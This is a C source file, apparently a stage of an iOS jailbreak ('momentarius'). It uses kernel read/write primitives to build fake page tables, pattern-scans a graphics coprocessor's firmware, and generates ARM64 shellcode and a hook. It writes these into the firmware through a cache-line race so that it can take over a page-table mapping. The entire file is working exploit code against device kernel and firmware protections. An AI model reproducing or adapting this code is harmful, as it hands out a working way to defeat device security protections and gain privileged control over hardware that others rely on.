#include <libjailbreak/primitives.h>
#include "momentarius.h"
#include "utils.h"

__attribute__((naked)) static void gfx_write_cachelines_v1(uint64_t shc_in, uint64_t shc_out, uint64_t ttbr1_in, uint64_t ttbr1_out, uint64_t hook_in, uint64_t hook_out) {
    asm("adrp x10, _stop_write@PAGE");
    asm("add x10, x10, _stop_write@PAGEOFF");
    asm("dmb sy");
    asm("0:");
    asm("ldrb w6, [x10]");
    asm("cbnz w6, 1f");
    asm("ldp x6, x7, [x0]");
    asm("stp x6, x7, [x1]");
    asm("ldp x6, x7, [x0, #0x10]");
    asm("stp x6, x7, [x1, #0x10]");
    asm("ldp x6, x7, [x0, #0x20]");
    asm("stp x6, x7, [x1, #0x20]");
    asm("ldp x6, x7, [x0, #0x30]");
    asm("stp x6, x7, [x1, #0x30]");
    asm("ldr x6, [x0, #0x40]");
    asm("str x6, [x1, #0x40]");
    asm("ldr x6, [x2]");
    asm("str x6, [x3]");
    asm("ldr w6, [x4]");
    asm("str w6, [x5]");
    asm("b 0b");
    asm("1:");
    asm("dsb sy");
    asm("ret");
}

__attribute__((naked)) static void gfx_write_cachelines_v2(uint64_t shc_in, uint64_t shc_out, uint64_t ttbr1_in, uint64_t ttbr1_out, uint64_t hook_in, uint64_t hook_out) {
    asm("adrp x10, _stop_write@PAGE");
    asm("add x10, x10, _stop_write@PAGEOFF");
    asm("dmb sy");
    asm("0:");
    asm("ldrb w6, [x10]");
    asm("cbnz w6, 1f");
    asm("ldp x6, x7, [x0]");
    asm("stp x6, x7, [x1]");
    asm("ldp x6, x7, [x0, #0x10]");
    asm("stp x6, x7, [x1, #0x10]");
    asm("ldr x6, [x0, #0x20]");
    asm("str x6, [x1, #0x20]");
    asm("ldp x6, x7, [x2]");
    asm("stp x6, x7, [x3]");
    asm("ldr w6, [x4]");
    asm("str w6, [x5]");
    asm("b 0b");
    asm("1:");
    asm("dsb sy");
    asm("ret");
}

static void gfx_write_cachelines(uint64_t shc_in, uint64_t shc_out, uint64_t ttbr1_in, uint64_t ttbr1_out, uint64_t hook_in, uint64_t hook_out) {
    if (momentarius.gfx.method == 2) {
        gfx_write_cachelines_v2(shc_in, shc_out, ttbr1_in, ttbr1_out, hook_in, hook_out);
    } else {
        gfx_write_cachelines_v1(shc_in, shc_out, ttbr1_in, ttbr1_out, hook_in, hook_out);
    }
}

static void *wait_for_pte(void *data) {
    uint32_t counter = 0;
    usleep(1000);
    
    while (1) {
        if (counter > 1000 && kread64(momentarius.target_kern_addr) == momentarius.target_pte) {
            *(volatile uint32_t *)data = 0xF100003F; // cmp x1, #0
            asm volatile ("dsb sy");
            usleep(100000);
            
            stop_write = true;
            break;
        }
        
        usleep(1000);
        if (++counter == 1000) {
            gfx_suspend();
            gfx_resume();
        }
    }
    return NULL;
}

static int gfx_run_patchfinder(void) {
    uint64_t second_page = map_phys_data(momentarius.gfx.text_pa + 0x4000, 0x4000);
    momentarius.gfx.method = 1;
    
    uint32_t msr = 0xD5182020; // msr TTBR1_EL1, x0
    for (uint64_t i = 0; i < 0x4000; i+=0x4) {
        if (*(volatile uint32_t *)(second_page + i) == msr) {
            momentarius.gfx.method = 2;
            break;
        }
    }
    
    if (momentarius.gfx.method == 2) {
        uint32_t bfxil = 0xB3401C20; // bfxil x0, x1, #0, #8
        for (uint64_t i = 0; i < 0x4000; i+=0x4) {
            if (*(volatile uint32_t *)(second_page + i) == bfxil) {
                momentarius.gfx.ttbr1_load_offset = (uint32_t)(i - 0xc) + 0x4000;
                break;
            }
        }
        
        uint32_t mrs = 0xD5381000; // mrs x0, SCTLR_EL1
        uint32_t sctlr_offset = 0;
        
        for (uint64_t i = 0; i < 0x4000; i+=0x4) {
            if (*(volatile uint32_t *)(second_page + i) == mrs) {
                sctlr_offset = (uint32_t)i;
                break;
            }
        }
        
        if (sctlr_offset != 0) {
            uint32_t cmp_x1 = 0xF100003F; // cmp x1, #0
            uint32_t start = sctlr_offset + 0x4;
            
            for (uint64_t i = start; i < 0x4000-0x4; i+=0x4) {
                if (*(volatile uint32_t *)(second_page + i) == cmp_x1) {
                    momentarius.gfx.hook_offset = (uint32_t)i + 0x4000;
                    break;
                }
            }
        }
    } else {
        uint32_t cmp_x0 = 0xF100001F; // cmp x0, #0
        for (uint64_t i = 0; i < 0x4000-0x4; i+=0x4) {
            if (*(volatile uint32_t *)(second_page + i) == cmp_x0) {
                uint32_t next = *(volatile uint32_t *)(second_page + i + 0x4);
                if ((next & A64_B_COND_MASK) == A64_B_COND_OPCODE) {
                    momentarius.gfx.ttbr1_load_offset = (uint32_t)i + 0x4000;
                    break;
                }
            }
        }
        
        if (momentarius.gfx.ttbr1_load_offset != 0) {
            uint32_t cmp_x1 = 0xF100003F; // cmp x1, #0
            uint32_t start = (momentarius.gfx.ttbr1_load_offset - 0x4000) + 0x4;
            
            for (uint64_t i = start; i < 0x4000-0x4; i+=0x4) {
                if (*(volatile uint32_t *)(second_page + i) == cmp_x1) {
                    momentarius.gfx.hook_offset = (uint32_t)i + 0x4000;
                    break;
                }
            }
        }
    }
    
    if (momentarius.gfx.ttbr1_load_offset == 0) return -1;
    if (momentarius.gfx.hook_offset == 0) return -1;
    momentarius.gfx.shc_offset = 0x2000; // seems like 0x2000 is always usable
    
    debug_log("ttbr1_load_offset: 0x%x\n", momentarius.gfx.ttbr1_load_offset);
    debug_log("hook_offset: 0x%x\n", momentarius.gfx.hook_offset);
    debug_log("shc_offset: 0x%x\n", momentarius.gfx.shc_offset);
    return 0;
}

static int gfx_gen_shellcode(void) {
    if ((momentarius.gfx.shc_data = calloc(1, 0x80)) == NULL) return -1;
    if ((momentarius.gfx.ttbr1_load_data = calloc(1, 0x40)) == NULL) return -1;
    if ((momentarius.gfx.hook_data = calloc(1, 0x20)) == NULL) return -1;
    
    if (momentarius.gfx.method == 2) {
        /* 0x00 */ momentarius.gfx.ttbr1_load_data[0] = a64_gen_movz(0, momentarius.new_ttbr1 & 0xffff, 0);
        /* 0x04 */ momentarius.gfx.ttbr1_load_data[1] = a64_gen_movk(0, (momentarius.new_ttbr1 >> 16) & 0xffff, 16);
        /* 0x08 */ momentarius.gfx.ttbr1_load_data[2] = a64_gen_movk(0, (momentarius.new_ttbr1 >> 32) & 0xffff, 32);
        /* 0x0C */ momentarius.gfx.ttbr1_load_data[3] = 0xD65F03C0; // ret
    } else {
        /* 0x00 */ momentarius.gfx.ttbr1_load_data[0] = a64_gen_branch(momentarius.gfx.ttbr1_load_offset, momentarius.gfx.shc_offset + 0x28);
    }
    
    /* 0x00 */ momentarius.gfx.shc_data[0] = 0xB25C6FE9; // mov x9, #0xfffffff000000000
    /* 0x04 */ momentarius.gfx.shc_data[1] = a64_gen_movk(9, momentarius.target_gfx_addr & 0xffff, 0);
    /* 0x08 */ momentarius.gfx.shc_data[2] = a64_gen_movk(9, (momentarius.target_gfx_addr >> 16) & 0xffff, 16);
    /* 0x0C */ momentarius.gfx.shc_data[3] = a64_gen_movz(8, momentarius.target_pte & 0xffff, 0);
    /* 0x10 */ momentarius.gfx.shc_data[4] = a64_gen_movk(8, (momentarius.target_pte >> 16) & 0xffff, 16);
    /* 0x14 */ momentarius.gfx.shc_data[5] = a64_gen_movk(8, (momentarius.target_pte >> 32) & 0xffff, 32);
    /* 0x18 */ momentarius.gfx.shc_data[6] = a64_gen_movk(8, (momentarius.target_pte >> 48) & 0xffff, 48);
    /* 0x1C */ momentarius.gfx.shc_data[7] = 0xF9000128; // str x8, [x9]
    /* 0x20 */ momentarius.gfx.shc_data[8] = 0xF100003F; // cmp x1, #0
    /* 0x24 */ momentarius.gfx.shc_data[9] = a64_gen_branch(momentarius.gfx.shc_offset + 0x24, momentarius.gfx.hook_offset + 0x4);
    
    if (momentarius.gfx.method == 1) {
        /* 0x28 */ momentarius.gfx.shc_data[10] = 0xF100001F; // cmp x0, #0
        /* 0x2C */ momentarius.gfx.shc_data[11] = a64_gen_cond_branch(momentarius.gfx.shc_offset + 0x2c, momentarius.gfx.ttbr1_load_offset + 0x4, 0);
        /* 0x30 */ momentarius.gfx.shc_data[12] = 0x91042007; // add x7, x0, #0x108
        /* 0x34 */ momentarius.gfx.shc_data[13] = a64_gen_movz(8, momentarius.new_ttbr1 & 0xffff, 0);
        /* 0x38 */ momentarius.gfx.shc_data[14] = a64_gen_movk(8, (momentarius.new_ttbr1 >> 16) & 0xffff, 16);
        /* 0x3C */ momentarius.gfx.shc_data[15] = a64_gen_movk(8, (momentarius.new_ttbr1 >> 32) & 0xffff, 32);
        /* 0x40 */ momentarius.gfx.shc_data[16] = 0xF90000E8; // str x8, [x7]
        /* 0x44 */ momentarius.gfx.shc_data[17] = a64_gen_branch(momentarius.gfx.shc_offset + 0x44, momentarius.gfx.ttbr1_load_offset + 0x8);
    }
    
    /* 0x00 */ momentarius.gfx.hook_data[0] = a64_gen_branch(momentarius.gfx.hook_offset, momentarius.gfx.shc_offset);
    return 0;
}

int momentarius_init_A13(void) {
    uint64_t mapping = map_phys_data(momentarius.gfx.text_pa, 0x4000);
    if (mapping == 0) return -1;
    uint64_t info_offset = 0;
    
    for (uint32_t i = 0; i < 0x4000; i+=0x8) {
        if (*(volatile uint64_t *)(mapping + i) == 0x7777777777777700) {
            info_offset = i + 0x8;
            break;
        }
    }
    
    debug_log("info_offset: 0x%llx\n", info_offset);
    if (info_offset == 0) return -1;
    uint64_t info_struct = mapping + info_offset;
    momentarius.gfx.data_va = *(volatile uint64_t *)(info_struct - 0x28);
    debug_log("data_va: 0x%llx\n", momentarius.gfx.data_va);
    
    momentarius.gfx.data_size = *(volatile uint64_t *)(info_struct - 0x20) - momentarius.gfx.data_va;
    debug_log("data_size: 0x%llx\n", momentarius.gfx.data_size);
    
    momentarius.gfx.text_size = momentarius.gfx.data_va - momentarius.gfx.text_va;
    debug_log("text_size: 0x%llx\n", momentarius.gfx.text_size);
    
    uint64_t encoded_data_addr = *(volatile uint64_t *)info_struct;
    debug_log("encoded_data_addr: 0x%llx\n", encoded_data_addr);
    
    uint64_t encoded_ttbr_addr = *(volatile uint64_t *)(info_struct + 0x38);
    debug_log("encoded_ttbr_addr: 0x%llx\n", encoded_ttbr_addr);
    
    if ((encoded_data_addr - momentarius.gfx.text_va) >= momentarius.gfx.text_size ||
        (encoded_ttbr_addr - momentarius.gfx.text_va) >= momentarius.gfx.text_size) return -1;
    
    uint64_t unshifted_data_pa = map_physread64(momentarius.gfx.text_pa + (encoded_data_addr - momentarius.gfx.text_va));
    debug_log("unshifted_data_pa: 0x%llx\n", unshifted_data_pa);
    
    uint64_t unshifted_ttbr_pa = map_physread64(momentarius.gfx.text_pa + (encoded_ttbr_addr - momentarius.gfx.text_va));
    debug_log("unshifted_ttbr_pa: 0x%llx\n", unshifted_ttbr_pa);
    
    uint64_t phys_shift = 0;
    uint8_t *unshifted_data = (uint8_t *)&unshifted_data_pa;
    uint8_t *unshifted_ttbr = (uint8_t *)&unshifted_ttbr_pa;
    
    do {
        uint8_t data_val = *unshifted_data++;
        momentarius.gfx.data_pa |= (uint64_t)data_val << phys_shift;
        
        uint8_t ttbr_val = *unshifted_ttbr++;
        momentarius.gfx.ttbr_pa |= (uint64_t)ttbr_val << phys_shift;
        phys_shift += 8;
    } while (phys_shift != 64);
    
    debug_log("data_pa: 0x%llx\n", momentarius.gfx.data_pa);
    debug_log("ttbr_pa: 0x%llx\n", momentarius.gfx.ttbr_pa);
    
    if ((momentarius.gfx.ttbr_kva = gfx_phystokv(momentarius.gfx.ttbr_pa)) == 0) return -1;
    debug_log("ttbr_kva: 0x%llx\n", momentarius.gfx.ttbr_kva);
    
    if ((momentarius.fake_l1_table_kva = kalloc_page()) == 0) return -1;
    if ((momentarius.fake_l2_table_kva = kalloc_page()) == 0) return -1;
    if ((momentarius.self_ref_pt_kva = kalloc_page()) == 0) return -1;
    if ((momentarius.target_rw_mapping = kalloc_page()) == 0) return -1;
    
    uint64_t l1_table_phys = kvtophys(momentarius.fake_l1_table_kva);
    uint64_t l2_table_phys = kvtophys(momentarius.fake_l2_table_kva);
    uint64_t l3_table_pte = 0;
    uint64_t level = 3;
    
    if (l1_table_phys == 0 || l2_table_phys == 0) return -1;
    momentarius.new_ttbr1 = l1_table_phys;
    vtophys_lvl(momentarius.kern_ttep, momentarius.self_ref_pt_kva, &level, &l3_table_pte);
    if (l3_table_pte == 0) return -1;
    
    uint64_t l3_table_pte_kva = phystokv(l3_table_pte);
    if (!KADDR_VALID(l3_table_pte_kva)) return -1;
    
    uint64_t l3_table_pte_pa = kvtophys(l3_table_pte_kva & ~0x3FFF);
    if (l3_table_pte == 0) return -1;
    
    uint64_t l3_table_mapping_pte = kread64(l3_table_pte_kva);
    if (l3_table_mapping_pte == 0) return -1;
    
    level = 3;
    uint64_t mapping_pte = 0;
    vtophys_lvl(momentarius.kern_ttep, momentarius.target_rw_mapping, &level, &mapping_pte);
    if (mapping_pte == 0) return -1;
    
    uint64_t target_l3_table_pa = kvtophys(phystokv(mapping_pte) & ~0x3FFF);
    if (target_l3_table_pa == 0) return -1;
    
    uint8_t data[0x40] = {0};
    kreadbuf(momentarius.gfx.ttbr_kva, &data[0], 0x40);
    kwritebuf(momentarius.fake_l1_table_kva, &data[0], 0x40);
    kwrite64(momentarius.fake_l1_table_kva + 0x38, l2_table_phys | 0x3);
    kwrite64(momentarius.fake_l2_table_kva, (l3_table_pte_pa & 0xFFFFFE000000LL) | 0x20000000000445LL);
    
    momentarius.target_pte = (l3_table_mapping_pte & 0xFFFF000000003FFFLL) | target_l3_table_pa;
    momentarius.target_kern_addr = l3_table_pte_kva;
    momentarius.target_gfx_addr = (0xFFFFFFF000000000 | (l3_table_pte_pa & 0x1FFC000) + (l3_table_pte_kva & 0x3FFF));
    debug_log("target_pte: 0x%llx\n", momentarius.target_pte);
    debug_log("target_kern_addr: 0x%llx\n", momentarius.target_kern_addr);
    debug_log("target_gfx_addr: 0x%llx\n", momentarius.target_gfx_addr);
    
    if (gfx_run_patchfinder() != 0) return -1;
    if (gfx_gen_shellcode() != 0) return -1;
    
    uint64_t shc_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.shc_offset);
    uint64_t ttbr1_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.ttbr1_load_offset);
    uint64_t hook_page = map_writeback_page(momentarius.gfx.text_pa + momentarius.gfx.hook_offset);
    if (shc_page == 0 || ttbr1_page == 0 || hook_page == 0) return -1;
    
    uint64_t shc_input = (uint64_t)momentarius.gfx.shc_data;
    uint64_t shc_output = shc_page + (momentarius.gfx.shc_offset & 0x3fff);
    uint64_t ttbr1_input = (uint64_t)momentarius.gfx.ttbr1_load_data;
    uint64_t ttbr1_output = ttbr1_page + (momentarius.gfx.ttbr1_load_offset & 0x3fff);
    uint64_t hook_input = (uint64_t)momentarius.gfx.hook_data;
    uint64_t hook_output = hook_page + (momentarius.gfx.hook_offset & 0x3fff);
    
    pthread_t wait_thread = NULL;
    pthread_create(&wait_thread, NULL, wait_for_pte, (void *)hook_input);
    
    gfx_write_cachelines(shc_input, shc_output, ttbr1_input, ttbr1_output, hook_input, hook_output);
    pthread_join(wait_thread, NULL);
    
    momentarius.target_rw_pte = momentarius.self_ref_pt_kva + ((momentarius.target_rw_mapping >> 11) & 0x3FF8);
    momentarius.orig_pte = kread64(momentarius.target_rw_pte);
    usleep(100000);
    return 0;
}
